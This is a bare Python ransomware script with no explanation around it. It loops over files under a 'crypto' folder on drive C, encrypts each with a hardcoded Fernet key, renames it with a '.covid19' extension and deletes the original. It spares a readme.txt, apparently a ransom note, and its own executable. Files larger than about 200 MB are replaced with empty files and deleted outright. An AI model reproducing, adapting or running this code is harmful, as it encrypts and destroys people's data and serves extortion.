from cryptography.fernet import Fernet
import time 
import os 
user = os.getlogin()
app = f"{user}.exe"
cipher_suite = Fernet(b'ZVEQ3p53kJuXn2EN-ZyJduwRuBtoYzwTQ8NOjxiCTaY=')
def encrypt_disk(DriveLetter):
    while True:
        for root, dirs, files in os.walk(f"{DriveLetter}:\\crypto\\"):  
        	try :
	        	for file in files:
	        		if file.endswith(f".covid19") or file=="readme.txt" or file==f"{app}":
	        			continue
	        		file_path = os.path.join(root, file) 
	        		with open(file_path, "rb") as f: 
	        			data = f.read() 
	        		encrypted_data = cipher_suite.encrypt(data) 
	        		with open(file_path + ".covid19", "wb") as f:
	        			if data.__sizeof__() > 204000000:
	        				f.write(b'')
	        				os.unlink(file_path)
	        			else:
		        			f.write(encrypted_data)
		        			os.unlink(file_path)
        	except PermissionError:
	        		continue
        time.sleep(10)

encrypt_disk("C")
